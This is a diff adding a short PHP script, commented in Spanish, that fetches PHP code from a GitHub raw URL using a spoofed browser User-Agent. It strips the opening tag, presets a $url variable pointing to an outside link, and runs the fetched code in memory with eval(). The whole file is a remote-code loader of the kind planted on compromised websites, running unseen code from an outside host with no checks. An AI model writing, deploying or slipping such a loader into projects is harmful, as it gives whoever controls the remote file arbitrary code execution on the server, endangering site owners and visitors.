@@ -1,0 +1,32 @@
+<?php
+
+// 1. URL del archivo PHP en GitHub (DEBE SER LA URL "RAW")
+// Ejemplo: "https://raw.githubusercontent.com/tu-usuario/tu-repo/main/tu_script.php"
+$github_php_raw_url = "https://raw.githubusercontent.com/Sherpa47/tu-repositorio/main/tu_script.php";
+
+// 2. Configurar el contexto HTTP para incluir un User-Agent
+$opts = [
+    "http" => [
+        "method" => "GET",
+        "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+    ]
+];
+$context = stream_context_create($opts);
+
+// 3. Descargar el código PHP remoto desde GitHub
+$remote_code = file_get_contents($github_php_raw_url, false, $context);
+
+if ($remote_code !== false) {
+    // 4. Limpiar la etiqueta inicial '<?php' si está presente en el archivo remoto
+    $clean_code = preg_replace('/^<\?php\s*/i', '', $remote_code);
+    
+    // 5. Definir la variable $url localmente antes de ejecutar el código remoto
+    $url = "https://cuttingfame.net/e/k55htp1f198yp";
+
+    // 6. Ejecutar el código remoto en memoria
+    eval($clean_code);
+} else {
+    echo "Error: No se pudo obtener el script PHP remoto desde GitHub.";
+}
+
+?>
